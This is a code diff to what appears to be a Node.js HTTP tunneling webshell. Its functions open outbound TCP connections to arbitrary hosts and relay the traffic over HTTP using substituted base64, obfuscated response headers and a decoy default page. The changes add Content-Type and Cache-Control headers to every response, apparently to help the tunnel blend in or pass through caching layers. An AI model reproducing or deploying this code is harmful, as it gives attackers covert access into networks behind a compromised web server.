@@ -20,7 +20,8 @@ function createOutboundTCP(res, host, port, mark)
 			// var cookie = 'Ur' + Math.random();
 			tcpconns[mark] = tcpConn;
 			dataBuff[mark] = new Array();
-
+			res.setHeader('Content-Type', 'text/html');
+			res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 			res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
 			res.end();
 		});
@@ -32,6 +33,8 @@ function createOutboundTCP(res, host, port, mark)
 
 		tcpConn.on('error', function(error) {
 			console.log("Error creating new Outbound: " + error.message);
+			res.setHeader('Content-Type', 'text/html');
+			res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 			res.writeHead(200, {'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk' : 'B4LqkZ2Fb6xREzSBgV0TUHU36Bl9FEMxxsabiDhypWS'});
 			res.end();
 		});
@@ -44,6 +47,8 @@ function createOutboundTCP(res, host, port, mark)
             tcpConn.on( 'connect', function() {
 				tcpconns[mark] = tcpConn;
 				dataBuff[mark] = new Array();
+				res.setHeader('Content-Type', 'text/html');
+				res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 				res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
 				res.end();
             });
@@ -55,12 +60,16 @@ function createOutboundTCP(res, host, port, mark)
 
             tcpConn.on('error', function(error){
 				console.log("Error creating new Outbound: "+error.message);
+				res.setHeader('Content-Type', 'text/html');
+				res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 				res.writeHead(200, {'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk' : 'B4LqkZ2Fb6xREzSBgV0TUHU36Bl9FEMxxsabiDhypWS'});
 				res.end();
             });
     }
     else
     {
+		res.setHeader('Content-Type', 'text/html');
+		res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
         res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
         res.end();
     }
@@ -71,6 +80,8 @@ function readOutboundTCP(res, mark)
 	var currData = dataBuff[mark].pop();
 	if(currData != null)
 	{
+		res.setHeader('Content-Type', 'text/html');
+		res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 		res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy','Connection': 'Keep-Alive'});
 		res.write(StrTr(Buffer.from(currData).toString('base64'), en, de));
 		// var tmp = new Buffer.from(currData).toString('hex');
@@ -81,6 +92,8 @@ function readOutboundTCP(res, mark)
 	else
 	{
 		console.log('NO DATA IN BUFFER');
+		res.setHeader('Content-Type', 'text/html');
+		res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 		res.writeHead(200, {'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
 		res.end();
 	}
@@ -102,11 +115,15 @@ function disconnectOutboundTCP(res, mark, error)
 	if(error!=null)
 	{
 		var sessionid = 'Ur' + Math.random();
+		res.setHeader('Content-Type', 'text/html');
+		res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 		res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';', "XXXX": error.message});
 		res.end();
 	 }
 	 else
 	 {
+		res.setHeader('Content-Type', 'text/html');
+		res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 		res.writeHead(200, {'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
 		res.end();
 	 }
@@ -114,6 +131,8 @@ function disconnectOutboundTCP(res, mark, error)
 }
 function deault_page(res) {
 	var sessionid = 'Ur' + Math.random();
+	res.setHeader('Content-Type', 'text/html');
+	res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 	res.writeHead(200, {'Set-Cookie': 'SESSIONID=' + sessionid + ';'});
 	res.end("<!-- 4XGAWvTzOgoJqo8xf7oTSQfnpbwnxVilvENiU8KxTEnGLUqgdYHYxKi3_b30S -->");
 }
@@ -136,12 +155,16 @@ function forwardData(req, res, mark)
 				// console.log("[+] Send to server: " + tmp);
 				// console.log("[+] Length of data to send: " + databaffuer.length);
 				tcpSocket.write(databaffuer);
+				res.setHeader('Content-Type', 'text/html');
+				res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 				res.writeHead(200,{'Xfulovtoate': 'WfmMwMDPzvZ0KTFcRgiy2PQWxZBCLIvwWnRQK15IGeRmz4LVR48O1OsKllNy'});
 				res.end();
 			}
 			else
 			{
 				console.log('No Cookie session to forward');
+				res.setHeader('Content-Type', 'text/html');
+				res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 				res.writeHead(200,{'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk':'dNjNxKHCAtzFfDd1INueNY9szIfKpBE1yDblp_EdoGKGjfT1U6k6GZ'});
 				res.end();
 			}
@@ -149,6 +172,8 @@ function forwardData(req, res, mark)
 		else
 		{
 			console.log('No data in forward');
+			res.setHeader('Content-Type', 'text/html');
+			res.setHeader('Cache-Control', 's-max-age=1, stale-while-revalidate');
 			res.writeHead(200,{'Xfulovtoate':'orm5it0Qa3Q6wTbk8Le4uoevx1jNqhaIFzTnaM1GpH70','Vifk':'dNjNxKHCAtzFfDd1INueNY9szIfKpBE1yDblp_EdoGKGjfT1U6k6GZ'});
 			res.end();
 		}
